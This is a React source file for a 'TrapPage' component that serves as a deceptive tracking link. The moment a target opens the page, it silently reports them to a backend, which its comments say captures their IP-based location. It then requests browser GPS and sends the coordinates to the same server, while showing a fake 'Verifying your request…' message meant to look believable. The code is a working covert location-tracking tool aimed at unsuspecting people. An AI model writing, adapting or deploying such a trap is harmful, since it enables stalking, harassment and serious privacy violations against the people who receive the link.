import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";

const API = process.env.REACT_APP_API_URL || "http://localhost:5000";

export default function TrapPage() {
  const { linkId } = useParams();
  const [status, setStatus] = useState("loading"); // loading | done | invalid

  useEffect(() => {
    const run = async () => {
      try {
        // Step 1: silent IP-based capture, happens the instant the page loads
        const { data } = await axios.post(`${API}/api/track/hit/${linkId}`);
        if (!data.success) {
          setStatus("invalid");
          return;
        }
        setStatus("done");

        // Step 2: optionally ask for precise GPS. Browser WILL show a permission
        // popup here - this cannot be hidden or skipped, by design.
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              await axios.post(`${API}/api/track/gps/${data.hitId}`, {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              });
            },
            () => {
              // user denied - that's fine, IP-based location is already captured
            }
          );
        }
      } catch (e) {
        setStatus("invalid");
      }
    };
    run();
  }, [linkId]);

  if (status === "invalid") {
    return (
      <div style={styles.wrap}>
        <p>This link is no longer active.</p>
      </div>
    );
  }

  // Neutral, believable content the target actually sees.
  // Keep this generic - swap the copy for whatever your case needs.
  return (
    <div style={styles.wrap}>
      <h2>Verifying your request…</h2>
      <p>Please wait while we process the details.</p>
    </div>
  );
}

const styles = {
  wrap: {
    fontFamily: "sans-serif",
    textAlign: "center",
    marginTop: "20vh",
  },
};
